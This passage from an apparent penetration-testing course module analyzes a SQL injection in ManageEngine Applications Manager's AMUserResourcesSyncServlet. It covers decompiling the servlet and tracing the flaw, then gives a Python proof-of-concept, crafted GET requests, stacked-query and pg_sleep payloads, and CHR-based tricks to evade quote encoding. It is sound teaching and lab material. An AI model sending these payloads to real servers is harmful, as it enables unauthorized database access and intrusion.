This module includes an in-depth analysis and exploitation of a SQL Injection vulnerability identified in the _ManageEngine_ _AMUserResourceSyncServlet_ servlet that can be used to gain access to the underlying operating system. The module will also discuss ways in which you can audit compiled Java servlets to detect similar critical vulnerabilities.

## 3.1. Getting Started

Revert the ManageEngine virtual machine from the _Labs_ page. You can access the admin interface at the URL below, replacing _manageengine_ with the IP address of the target.

|URL|Username|Password|
|---|---|---|
|https://manageengine:8443/|admin|admin|

> Table 1 - Setup information

## 3.2. Vulnerability Discovery

As described by the vendor,[1](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/summary-10600/summary-10856#fn-local_id_172-1)

ManageEngine Applications Manager is an application performance monitoring solution that proactively monitors business applications and help businesses ensure their revenue-critical applications meet end user expectations. Applications Manager offers out of the box monitoring support for 80+ applications and servers.

One of the reasons we decided to look into the ManageEngine Application Manager was because we have encountered a number of ManageEngine applications over the course of our pentesting careers. Although the ManageEngine application portfolio has matured over the years, it is still a source of interesting vulnerabilities as we will demonstrate during this module.

Whenever we start auditing an unfamiliar web application, we first need to familiarize ourselves with the target and learn about the exposed attack surface. In the case of ManageEngine's Application Manager interface, we can see (Figure 1) that most URIs consist of the .do extension. A quick Google search leads us to a file extensions explanation page,[2](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/summary-10600/summary-10856#fn-local_id_172-2) which states that the .do extension is typically a URL mapping scheme for compiled Java code.

![Figure 1: Accessing the Administration panel of ManageEngine Applications Manager](https://static.offsec.com/offsec-courses/WEB-300/images/manageengine_sqli/3e8bfaa72eb15d3a48dc5291f8e99642-Picture1.png)

Figure 1: Accessing the Administration panel of ManageEngine Applications Manager

1

(Zoho Corp., 2020), [https://www.manageengine.com/products/applications_manager/](https://www.manageengine.com/products/applications_manager/) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/summary-10600/summary-10856#fnref-local_id_172-1)

2

(Sharpened Productions, 2020), [https://fileinfo.com/extension/do](https://fileinfo.com/extension/do) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/summary-10600/summary-10856#fnref-local_id_172-2)

### 3.2.1. Servlet Mappings

Given the extension explanation, we start by launching Process Explorer[1](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/summary-10600/summary-10856#fn-local_id_173-1) to gain additional insight into the Java process we are targeting:

![Figure 2: The ManageEngine Java target process](https://static.offsec.com/offsec-courses/WEB-300/images/java-dsrlz-rce/54b9c9085d8ab9f589ac64b28630b058-Picture5.png)

Figure 2: The ManageEngine Java target process

A natural question at this point might be: how do we know which Java process to target? In this case, we are fortunate as there is only one Java process running on our vulnerable machine. Some applications use multiple Java process instances though. In such cases, we can check any given process properties in Process Explorer by right-clicking on the process name and choosing _Properties_ (Figure 3).

![Figure 3: Checking out the properties of the Java.exe process, spawned by wrapper.exe](https://static.offsec.com/offsec-courses/WEB-300/images/java-dsrlz-rce/19e8e34e2b068e6d68883a2224c064d5-Picture6.png)

Figure 3: Checking out the properties of the Java.exe process, spawned by wrapper.exe

In the Path location (Figure 3), we can see that the process uses a working directory of C:\Program Files\ManageEngine\AppManager12\working\.

This confirms that we are on the right track. Furthermore, this directory is a good place to start looking for additional information regarding our target application. More specifically, Java web applications use a deployment descriptor file named web.xml to determine how URLs map to servlets,[2](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/summary-10600/summary-10856#fn-local_id_173-2) which URLs require authentication, and other information. This file is essential when we look for the implementations of any given functionality exposed by the web application.

With that said, within the working directory, we see a WEB-INF folder, which is the Java's default configuration folder path where we can find the web.xml file. This file contains a number of servlet names to servlet classes as well as the servlet name to URL mappings. Information like this will become useful once we know exactly which class we are targeting, since it will tell us how to reach it.

1

(MicroSoft, 2020), [https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/summary-10600/summary-10856#fnref-local_id_173-1)

2

(Wikipedia, 2020), [https://en.wikipedia.org/wiki/Java_servlet](https://en.wikipedia.org/wiki/Java_servlet) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/summary-10600/summary-10856#fnref-local_id_173-2)

### 3.2.2. Source Code Recovery

Now that we have a better idea about this application and how it is laid out, we can start thinking about how to look for any potential vulnerabilities. In this case, we decided to first look for SQL injections.

Although detecting any type of vulnerability is not an easy task, being able to review the application source code can definitely accelerate the process. As we already discovered from the initial review, at least some components of the ManageEngine Application Manager are written in Java. Fortunately, compiled Java classes can be easily decompiled using publicly available software. But we need to first identify which Java class or classes we want to review.

By checking the contents of the C:\Program Files (x86)\ManageEngine\AppManager12\working\WEB-INF\lib directory, we notice that it contains a number of JAR files. If we just take a look at the names of these files, we can see that most of them are actually standard third party libraries such as struts.jar or xmlsec-1.3.0.jar. Only four JAR files in this directory appear to be native to ManageEngine. Of those four, AdventNetAppManagerWebClient.jar seems like a good starting candidate due to its rather self-explanatory name.

As already discussed at the beginning of the course, JAR files contain compiled Java classes and to recover the original Java source code from them we can make use of the _JD-GUI_ decompiler.

![Figure 4: Decompiled AdventNetAppManagerWebClient.jar file](https://static.offsec.com/offsec-courses/WEB-300/images/manageengine_sqli/a727703de1c37e605b17a768bac0a76f-Picture22.png)

Figure 4: Decompiled AdventNetAppManagerWebClient.jar file

Once we decompile our chosen JAR file, we notice that this is a rather substantial collection of Java classes. This means that we need to develop a methodology to make any sort of meaningful progress in our source code review.

Before we do that, it is worth mentioning that, while _JD-GUI_ is certainly an excellent decompiler, its search capabilities are not exactly the best. A better tool for this task would be Notepad++ which is already installed on our VM and could help us navigate this code base in a much easier way. In order to do that however, we first need to save the decompiled source code into human-readable .java files. _JD-GUI_ allows us to do that via the _File_ > _Save All Sources_ menu.

![Figure 5: Extracting decompiled Java classes](https://static.offsec.com/offsec-courses/WEB-300/images/manageengine_sqli/5525f771c44329aaaaa221620c53d799-Picture23.png)

Figure 5: Extracting decompiled Java classes

In Figure 5, we see that the extracted Java classes are saved in a compressed file. At this point, all we have left to do is decompress it and inspect the extracted files in Notepad++.

### 3.2.3. Analyzing the Source Code

Now that we have our tooling in place, it is time to actually start looking at the source code and trying to identify any vulnerabilities we could exploit. In a situation like this, we know that the target application is interacting with a database, so a natural instinct is to start reviewing all query strings we can find in the code. More specifically, we would try to identify all instances in which unsanitized user input could find its way into a query string and therefore lead to a typical SQL injection.

While analyzing the code base we noticed that most query strings are assigned to a variable named _query_ as shown in the listing below.

```
String query = "select count(*) from Alert where SEVERITY = " + i + " and groupname ='AppManager'";
```

> Listing 1 - An example query from the source code

The query in Listing 1 is a great example we can use to build a regular expression on, which can help us find the vast majority of the specific type of queries we are interested in. Specifically, it contains a couple of key strings we want to look for, namely "query" and "select", and also uses string concatenation using the "+" operator.

Notepad++ allows us to perform searches using regular expressions and the one we will start with looks like the following:

```
^.*?query.*?select.*?
```

> Listing 2 - Regular expression used to search for SELECT queries

If you are not familiar with regular expressions, we strongly suggest you spend some time learning them as they can be a very useful tool in the vulnerability discovery process. For now, just know that the expression from Listing 2 basically says:

- Look for any line that contains any number of alphanumeric characters at the beginning.
- Which is followed by the string QUERY
- Which is followed by any number of alphanumeric characters
- Which is followed by the string SELECT
- Which is followed by any number of alphanumeric characters

While this may sound complicated, it really is not.

Before we execute this search, we need to make sure that the _Regular Expression_ option is checked in the Notepad++ search dialog and that the Directory text box is pointing to the directory on our desktop that contains the extracted Java source code file (Figure 6).

![Figure 6: Searching for SELECT queries](https://static.offsec.com/offsec-courses/WEB-300/images/manageengine_sqli/3be66560721c11da9175628c3e7e020f-Picture24.png)

Figure 6: Searching for SELECT queries

As we can see in Figure 6, this does not seem to narrow our area of focus much, since we find almost 5000 instances of _SELECT_ queries in this JAR file alone. We may want to find a better way to search in order to reduce the number of instances we need to review. Keep in mind that there is nothing wrong with using the approach described above; however, we usually prefer to find a more reasonable starting point for the source code review.

Another approach when reviewing a web application is to start from the front-end user interface implementation and take a look at the HTTP request handlers first.

With that in mind, it is important to know that in a typical Java servlet, we can easily identify the HTTP request handler functions that handle each HTTP request type due to their constant and unique names.

These methods are named as follows:

- _doGet_
- _doPost_
- _doPut_
- _doDelete_
- _doCopy_
- _doOptions_

Since we already mentioned that we like to stay as close as possible to the entry points of user input into the application during the beginning stages of our source code audits, searching for all _doGet_ and _doPost_ function implementations seems like a good option.

![Figure 7: Locating all doGet() function implementations](https://static.offsec.com/offsec-courses/WEB-300/images/manageengine_sqli/aae32ff2fabbc2d1927a397dda10c036-Picture25.png)

Figure 7: Locating all doGet() function implementations

In the case of _doGet_, we only find 87 instances of the function implementation, which is a much more reasonable starting point.

With a much smaller attack surface to review, we can start looking at every instance of the _doGet_ implementation that processes user input before using it in a SQL query. This includes tracing user-input values through subsequent function calls that originated in the _doGet_ functions as well.

After spending some time using this methodology, we arrived at the _doGet_ implementation of the _AMUserResourcesSyncServlet_ class.

Typically, the _doPost_ and _doGet_ functions expect two parameters as shown in the listing below:

```
protected void doGet(HttpServletRequest req,
                     HttpServletResponse resp)
```

> Listing 3 - Example of a servlet HTTP request handler method

The first parameter is an _HttpServletRequest_[1](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/summary-10600/summary-10856#fn-local_id_175-1) object that contains the request a client has made to the web application, and the second one is an _HttpServletResponse_[2](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/summary-10600/summary-10856#fn-local_id_175-2) object that contains a response the servlet will send to the client after the request is processed.

From the attacker point of view, we are particularly interested in the _HttpServletRequest_ object, since that is what we can control. More specifically, we are interested in the servlet code that extracts HTTP request parameters through the _getParameter_ or _getParameterValues_ methods.[3](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/summary-10600/summary-10856#fn-local_id_175-3)

Now that we are familiar with how HTTP requests are processed in a Java servlet, let's dive straight into the _doPost_ and _doGet_ methods in the _AMUserResourcesSyncServlet_ class:

```
18: public class AMUserResourcesSyncServlet
19:   extends HttpServlet
20: {
21:   public void doPost(HttpServletRequest request, HttpServletResponse response)
22:     throws ServletException, IOException
23:   {
24:     doGet(request, response);
25:   }
26:   
27:   public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException
28:   {
29:     response.setContentType("text/html; charset=UTF-8");
30:     PrintWriter out = response.getWriter();
31:     String isSyncConfigtoUserMap = request.getParameter("isSyncConfigtoUserMap");
32:     if ((isSyncConfigtoUserMap != null) && ("true".equals(isSyncConfigtoUserMap)))
33:     {
34:       fetchAllConfigToUserMappingForMAS(out);
35:       return;
36:     }
37:     String masRange = request.getParameter("ForMasRange");
38:     String userId = request.getParameter("userId");
39:     String chkRestrictedRole = request.getParameter("chkRestrictedRole");
40:     AMLog.debug("[AMUserResourcesSyncServlet::(doGet)] masRange : " + masRange + ", userId : " + userId + " , chkRestrictedRole : " + chkRestrictedRole);
41:
42:     if ((chkRestrictedRole != null) && ("true".equals(chkRestrictedRole)))
43:     {
44:       boolean isRestricted = RestrictedUsersViewUtil.isRestrictedRole(userId);
45:       out.println(isRestricted);
46:
47:
48:     }
49:     else if (masRange != null) 
        {
50:       if ((userId != null) && (!"".equals(userId))) {
52:         fetchUserResourcesofMASForUserId(userId, masRange, out);
          } else {
56:         fetchAllUserResourcesForMAS(masRange, out);
57:       }
58:     }
```

> Listing 4 - The source code listing of the doPost/doGet methods in the AMUserResourcesSyncServlet servlet

First of all, in Listing 4 we can see that the _doPost_ method simply redirects to the _doGet_. In servlet implementations this practice where multiple HTTP verbs are handled by a single method is quite common.

In the _doGet_ function, we can see on lines 31, 37, 38, and 39 that four different user-controlled parameters are retrieved from the HTTP request: _isSyncConfigtoUserMap, ForMasRange, userId_, and _chkRestrictedRole_.

While we are in _JD-GUI_, we can make use of syntax highlighting. Any time we double-click a variable, _JD-GUI_ will highlight all instances where that variable is used. If we try this feature on the _userId_ variable we can see that, besides being used in the _doGet_ function, _userId_ is also used to build a _SELECT_ query within the _fetchUserResourcesofMASForUserId_ function (Figure 8).

![Figure 8: Syntax-tracing of the userId variable](https://static.offsec.com/offsec-courses/WEB-300/images/manageengine_sqli/559b6df0ce7b00de5a995bc1a6f217c2-Picture31.png)

Figure 8: Syntax-tracing of the userId variable

Let's have a look at the _fetchUserResourcesofMASForUserId_ implementation.

```
66:   public void fetchUserResourcesofMASForUserId(String userId, String masRange, PrintWriter out)
67:   {
68:     int stRange = Integer.parseInt(masRange);
69:     int endRange = stRange + EnterpriseUtil.RANGE;
70:     String qry = "select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=" + userId + " and RESOURCEID >" + stRange + " and RESOURCEID < " + endRange;
71:     AMLog.debug("[AMUserResourcesSyncServlet::(fetchUserResourcesofMASForUserId)] qry : " + qry);
72:     
73:     ResultSet rs = null;
74:     try
75:     {
76:       rs = AMConnectionPool.executeQueryStmt(qry);
77:       while (rs.next())
78:       {
79:         String resId = rs.getString(1);
80:         out.println(resId);
81:       }
82:     }
83:     catch (Exception ex)
84:     {
85:       ex.printStackTrace();
86:     }
87:     finally
88:     {
89:       AMConnectionPool.closeStatement(rs);
90:     }
91:   }
```

> Listing 5 - The fetchUserResourcesofMASForUserId method

In the previous listing we can see (line 70) that the _userId_ variable is concatenated into the query string that is executed at line 76. This certainly looks like a SQL injection vulnerability!

If we double-click on the _fetchUserResourcesofMASForUserId_ function name in JD-GUI, we can also see that it is being called from the _doGet_ function we started with on line 52 (Listing 4). Let's see how we can arrive there and check if any sanitization is taking place.

To do so, we need to concern ourselves with the first and second _if_ statements, on lines 32 and 42 respectively (Listing 4). Specifically, if they evaluate to TRUE, we would not be able to reach the _else if_ on line 49 (Listing 4), which is what we are trying to do. We'll get to this shortly.

If we look at the aforementioned _if_ statements, it is clear that we should be able to control the results of those statement evaluations as they depend on values that can be passed in a HTTP request. The key word here is "can." Notice that in both cases, the first check is whether the respective variables are _null_. This means we simply have to make sure that in our future requests, those parameters are not set and we should fall through to our target statement.

Speaking of which, the _else if_ statement checks for the presence of the _masRange_ variable (line 49 Listing 4) and only moves on to the next _if_ statement if the variable exists. Therefore, we need to make sure that our request has the _ForMasRange_ parameter set (line 37 Listing 4).

Finally, we arrive at the last _if_ statement, which follows the same pattern: check for the presence of the _userId_ variable (line 50 Listing 4) and make sure it is not an empty string.

We have gone through this entire analysis to conclude that we should be able to reach the _fetchUserResourcesofMASForUserId()_ function call without any sanitization of the _userId_ variable.

Furthermore, a quick look at Listing 5 shows that our variable is not sanitized within _fetchUserResourcesofMASForUserId_ either, which means that we do indeed appear to have a valid SQL injection vulnerability on our hands.

1

(Oracle, 2015), [https://docs.oracle.com/javaee/7/api/javax/servlet/http/HttpServletRequest.html](https://docs.oracle.com/javaee/7/api/javax/servlet/http/HttpServletRequest.html) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/summary-10600/summary-10856#fnref-local_id_175-1)

2

(Oracle, 2015), [https://docs.oracle.com/javaee/7/api/javax/servlet/http/HttpServletResponse.html](https://docs.oracle.com/javaee/7/api/javax/servlet/http/HttpServletResponse.html) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/summary-10600/summary-10856#fnref-local_id_175-2)

3

(Oracle, 2015), [https://docs.oracle.com/javaee/7/api/javax/servlet/ServletRequest.html#getParameter-java.lang.String](https://docs.oracle.com/javaee/7/api/javax/servlet/ServletRequest.html#getParameter-java.lang.String) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/summary-10600/summary-10856#fnref-local_id_175-3)

### 3.2.4. Enabling Database Logging

Before we continue, let's enable database logging. This can save us a lot of time while debugging applications, especially when we are dealing with possible SQL injection vulnerabilities. Although we already know what the query is, we need to see if any of our characters are transformed before they arrive at the database level.

Since ManageEngine uses _PostgreSQL_ as a back end database, we will need to edit its configuration file in order to enable any logging feature. In our virtual machine, the postgresql.conf file is located at the following path: C:\Program Files (x86)\ManageEngine\AppManager12\working\pgsql\data\amdb\postgresql.conf

In order to instruct the database to log all SQL queries we'll change the postgresql.conf _log_statement_ setting to _'all'_ as shown in the listing below.

```
log_statement = 'all'			# none, ddl, mod, all
```

> Listing 6 - Modifying the postgresql.conf file to enable query logging

After changing the log file, we will need to restart the ManageEngine Applications Manager service to apply the new settings. We can do this by launching _services.msc_ from the _Run_ command window and finding the ManageEngine Applications Manager service (Figure 9).

![Figure 9: Restarting the ManageEngine Applications Manager service](https://static.offsec.com/offsec-courses/WEB-300/images/manageengine_sqli/54b9c9085d8ab9f589ac64b28630b058-Picture5.png)

Figure 9: Restarting the ManageEngine Applications Manager service

Once the service is restarted, we will be able to see failed queries in log files, beginning with swissql, in the following directory:

```
C:\Program Files (x86)\ManageEngine\AppManager12\working\pgsql\data\amdb\pgsql_log\
```

> Listing 7 - PostgreSQL log directory

For the duration of our exploit development, we will need to be able to execute SQL queries directly against the database for debugging purposes.

One of the ways to do that is by using the _pgAdmin_ software, which is installed on the ManageEngine virtual machine. This is a front end for PostgreSQL, the database used by the target application.

![Figure 10: pgAdmin front end](https://static.offsec.com/offsec-courses/WEB-300/images/manageengine_sqli/76d2e09cf005266009831d42a5b51101-Picture26.png)

Figure 10: pgAdmin front end

To run SQL queries against the pg_catalog database, load up pgAdmin and connect to the local ManageEngine server instance.

Please refer to your course material in order to find the appropriate database credentials.

In pgAdmin, we can execute any SQL statement through the _Query Tool_ as shown in Figure 11 and Figure 12.

![Figure 11: Using the pgAdmin Query Tool](https://static.offsec.com/offsec-courses/WEB-300/images/manageengine_sqli/376e160567eb4e10dabdac2e62f32bbd-Picture27.png)

Figure 11: Using the pgAdmin Query Tool

![Figure 12: Executing a SQL query through the Query Tool](https://static.offsec.com/offsec-courses/WEB-300/images/manageengine_sqli/32fa8dba688686cf924504d0384c3685-Picture20.png)

Figure 12: Executing a SQL query through the Query Tool

Alternatively, if you are more comfortable using the command line utility psql.exe, you can use that as well. Please note that the ManageEngine server instance is configured to listen on port 15432.

![Figure 13: Using psql.exe to interact with the database](https://static.offsec.com/offsec-courses/WEB-300/images/manageengine_sqli/7778031deb92d473adacb13a9830c172-Picture28.png)

Figure 13: Using psql.exe to interact with the database

### 3.2.5. Triggering the Vulnerability

When available, analyzing the source code greatly accelerates vulnerability discovery and our understanding of any possible restrictions. Nevertheless, at some point we must trigger the vulnerability to make further progress. In order to do so, we need a URL to start crafting our request.

From the servlet mapping initially discovered in the web.xml file, we know that the URL we need to use to reach the vulnerable code is as follows:

```
<servlet-mapping>
    <servlet-name>AMUserResourcesSyncServlet</servlet-name>
    <url-pattern>/servlet/AMUserResourcesSyncServlet</url-pattern>
</servlet-mapping>
```

> Listing 8 - The servlet mapping

```
<servlet>
    <servlet-name>AMUserResourcesSyncServlet</servlet-name>
    <servlet-class>com.adventnet.appmanager.servlets.comm.AMUserResourcesSyncServlet</servlet-class>
</servlet>
```

> Listing 9 - The mapping location

Remember that during our analysis, we established that to reach the vulnerable SQL query, we only require two parameters in our request, namely _ForMasRange_ and _userId_.

Putting all the information together, our initial request will look like this:

```
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1; HTTP/1.1
Host: manageengine:8443
```

> Listing 10 - Triggering the vulnerability

Notice that the request above performs a basic injection using a semicolon. The reason for this is because we already know what the vulnerable query looks like (Listing 11) and we know that it does not contain any quoted strings. Therefore, trying to simply terminate the query with a semicolon at the injection point should work well.

```
String qry = "select distinct(RESOURCEID) from AM_USERRESOURCESTABLE
where USERID=" + userId + " and RESOURCEID >" + stRange + " and
RESOURCEID < " + endRange;
```

> Listing 11 - The SQL query taken from the code. Notice how there are no quotes that need to be escaped.

```
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
	if len(sys.argv) != 2:
		print "(+) usage %s <target>" % sys.argv[0]
		print "(+) eg: %s target" % sys.argv[0]
		sys.exit(1)
	
	t = sys.argv[1]
	
	sqli = ";"

	r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % t, 
					  params='ForMasRange=1&userId=1%s' % sqli, verify=False)
	print r.text
	print r.headers

if __name__ == '__main__':
	main()
```

> Listing 12 - Sample proof-of-concept to trigger the vulnerability

When we send our trigger request through Burp or a simple Python script (Listing 12), we get a response that is not very verbose. As a matter of fact, it is virtually empty as indicated by the _Content-Length_ of 0.

```
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID_APM_9090=5A0EF105FBA016EA342E8B6F20B8FB63;
Path=/; Secure; HttpOnly
Content-Type: text/html;charset=UTF-8
Content-Length: 0
Date: Sat, 26 Nov 2016 08:57:40 GMT
```

> Listing 13 - The HTTP response from the SQL Injection GET request

This is worth noting because in the case of a black box test, we would almost have no way of knowing that an SQL injection vulnerability even exists. The HTTP server does not pass through any kind of verbose errors, any POST body changes, or 500 status codes. In other words, at first glance everything seems okay.

Yet, when we look into the previously mentioned log file located in the C:\Program Files (x86)\ManageEngine\AppManager12\working\pgsql\data\amdb\pgsql_log\ directory, we see an error message that is clearly indicative of an SQL injection:

```
[ 2018-04-21 04:33:39.928 GMT ]:LOG:  execute <unnamed>: select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1
[ 2018-04-21 04:33:39.929 GMT ]:ERROR:  syntax error at or near "and" at character 2
[ 2018-04-21 04:33:39.929 GMT ]:STATEMENT:   and RESOURCEID >1 and RESOURCEID < 10000001
```

> Listing 14 - The injected ";" character breaks The SQL query confirming the presence of a vulnerability

Before we continue we need to provide a little but more detail about this particular vulnerability. In a brand new installation of our target web application, the data table that is used in the vulnerable query (_AM_USERRESOURCESTABLE_) does not contain any data. When this is true, it can lead to misleading or incomplete results if we only try injecting trivial payloads. Let's see why that is.

If we pay close attention, we can see that we have a few options for the type of payload we can inject. One approach would be to use a UNION query and extract data directly from the database. However, we need to be mindful of the fact that the _RESOURCEID_ column that the original query is referencing, is defined as a _BIGINT_ datatype. In other words, we could only extract arbitrary data when it is of the same data type.

```
select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1 UNION SELECT 1
```

> Listing 15 - A simple UNION injection payload

Another option is to use a _UNION_ query with a boolean-based blind injection. Similar to what we have already seen in ATutor, we could construct the injected queries to ask a series of _TRUE_ and _FALSE_ questions and infer the data we are trying to extract in that fashion.

```
select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1 UNION SELECT CASE WHEN (SELECT 1)=1 THEN 1 ELSE 0 END
```

> Listing 16 - An injection payload using UNION and a boolean conditional statement

The reason why we are not considering this approach is because one of the great things about Postgres SQL-injection attacks is that they allow an attacker to perform stacked queries. This means that we can use a query terminator character in our payload, as we saw in Listing 10, and inject a completely new query into the original vulnerable query string. This makes exploitation much easier since neither the injection point nor the payload are limited by the nature of the vulnerable query.

The downside with stacked queries is that they return multiple result sets. This can break the logic of the application and with it the ability to exfiltrate data with a boolean blind-based attack. Unfortunately, this is exactly what happens with our ManageEngine application. An example error message from the application logs (C:\Program Files (x86)\ManageEngine\AppManager12\logs\stdout.txt) when using stacked queries can be seen below.

```
[30 Nov 2018 07:40:23:556] SYS_OUT: AMConnectionPool : Error while executing query select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1;SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END)-- and RESOURCEID >1 and RESOURCEID < 10000001. Error Message : Multiple ResultSets were returned by the query.
```

> Listing 17 - Using stacked queries with boolean-based payloads results in the breakdown of application logic

In order to solve this problem and still be able to use the flexibility of stacked queries, we have to resort to time-based blind injection payloads.

In the case of PostgreSQL, to confirm the blind injection we would use the _pg_sleep_ function, as shown in the listing below.

```
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;
select+pg_sleep(10); HTTP/1.1
Host: manageengine:8443
```

> Listing 18 - Causing the database to sleep for 10 seconds before returning

Note that the plus sign between _select_ and _pg_sleep_ will be interpreted as a space. This could also be substituted with the “%20” characters, which are the URL-encoded equivalent of a space.

Now that we have verified our ability to execute stacked queries along with time-based blind injection, we can continue our exploit development.

#### Exercises

1. Improve the regex used earlier to locate all the _SELECT_ SQL queries in the code base in order to limit the results to only those which include string concatenation and a _WHERE_ clause.
2. Recreate the _pg_sleep_ injection as described in the previous section.
3. Experiment with different payloads and try to discover if there are any character limitations for the injected payloads.

## 3.3. How Houdini Escapes

As we previously stated, our ability to use stacked queries in the payload is very powerful. However, after testing various payloads, specifically those that include quoted strings, we noticed something strange. Let's take a look at the following simple example in which we inject a single quote in the query:

```
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1' HTTP/1.1
Host: manageengine:8443
```

> Listing 19 - Sending an SQL Injection payload that contains a single quote

Looking at the log file we see the following error:

```
[ 2018-04-21 04:42:58.221 GMT ]:ERROR:  operator does not exist: integer &# integer at character 73
[ 2018-04-21 04:42:58.221 GMT ]:HINT:  No operator matches the given name and argument type(s). You might need to add explicit type casts.
[ 2018-04-21 04:42:58.221 GMT ]:STATEMENT:  select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1&#39
```

> Listing 20 - The SQL error message in the log file

As it turns out, special characters are HTML-encoded before they are sent to the database for further processing. This causes us a few headaches as it seems that we cannot use quoted string values in our queries.

In MySQL, this could be solved easily. For example, the following two _select_ statements are equally valid:

```
MariaDB [mysql]> select concat('1337',' h@x0r')
    -> ;
+-------------------------+
| concat('1337',' h@x0r') |
+-------------------------+
| 1337 h@x0r              |
+-------------------------+
1 row in set (0.00 sec)

MariaDB [mysql]> select concat(0x31333337,0x206840783072)
    -> ;
+-----------------------------------+
| concat(0x31333337,0x206840783072) |
+-----------------------------------+
| 1337 h@x0r                        |
+-----------------------------------+
1 row in set (0.00 sec)
```

> Listing 21 - MySQL syntax that automatically decodes a string value from ASCII hex

As shown in the listing above, the ASCII characters in their hexadecimal representation are automatically decoded by the MySQL engine.

Unfortunately, this feature is not present in PostgreSQL. Moreover, upon of a review of the PostgreSQL documentation for string manipulation functions,[1](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/summary-10600/summary-10856#fn-local_id_178-1) we noticed that most functions used for encoding and decoding of various data formats such as _hex_ or _base64_ make use of quotes.

As an example, the listing below shows how to make use of the _decode_ function in PostgreSQL to convert our "AWAE" base64 encoded string:

```
select convert_from(decode('QVdBRQ==', 'base64'), 'utf-8');
```

> Listing 22 - Using the decode function in PostgreSQL. Note: we still need quotes!

![Figure 14: Testing out the decode function](https://static.offsec.com/offsec-courses/WEB-300/images/manageengine_sqli/34ed5022a05e7410dd6a1bc7b3fb837a-Picture7.png)

Figure 14: Testing out the decode function

1

(The PostgreSQL Global Development Group, 2020), [https://www.postgresql.org/docs/9.2/static/functions-string.html](https://www.postgresql.org/docs/9.2/static/functions-string.html) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/summary-10600/summary-10856#fnref-local_id_178-1)

### 3.3.1. Using CHR and String Concatenation

One of the ways in which we can bypass the quotes restriction is to use the _CHR_[1](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/summary-10600/summary-10856#fn-local_id_179-1) and _concatenation_ syntax. For example, in most situations, we can select individual characters using their code points[2](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/summary-10600/summary-10856#fn-local_id_179-2) (numbers that represent characters) and concatenate them together using the double pipe (||) operator.

```
amdb=#SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
 ?column?
----------
 AWAE
(1 row)
```

> Listing 23 - Using the char function to avoid quotes

The problem is that character concatenation only works for basic queries such as _SELECT_, _INSERT_, _DELETE_, etc. It does not work for all SQL statements.

```
amdb=# CREATE TABLE AWAE (offsec text); INSERT INTO AWAE(offsec) VALUES (CHR(65)||CHR(87)||CHR(65)||CHR(69));
CREATE TABLE
INSERT 0 1
amdb=# SELECT * from AWAE;
 offsec
--------
 AWAE
(1 row)
```

> Listing 24 - This is valid syntax

In the example above, the SQL statement creates a table called "AWAE" containing a single column of text and successfully inserts a record into it. However, if we try to execute a function, the query will fail. For example, here is the _COPY_ function using _CHR_ to write to a file:

```
CREATE TABLE AWAE (offsec text);
INSERT INTO AWAE(offsec) VALUES (CHR(65)||CHR(87)||CHR(65)||CHR(69));
COPY AWAE (offsec) TO CHR(99)||CHR(58)||CHR(92)||CHR(92)||CHR(65)||CHR(87)||CHR(65)||CHR(69));
ERROR:  syntax error at or near "CHR"
LINE 3: COPY AWAE (offsec) TO CHR(99)||CHR(58)||CHR(92)||CHR(92)||CH...
                              ^

********** Error **********
```

> Listing 25 - Failing at writing to the target file c:\\AWAE using the CHR function

While the _CHR_ function can be very helpful while dealing with non-printable characters, we need to find a better way to bypass the quotes restrictions for those situations where we need to make use of PostgreSQL functions such as _COPY_.

1

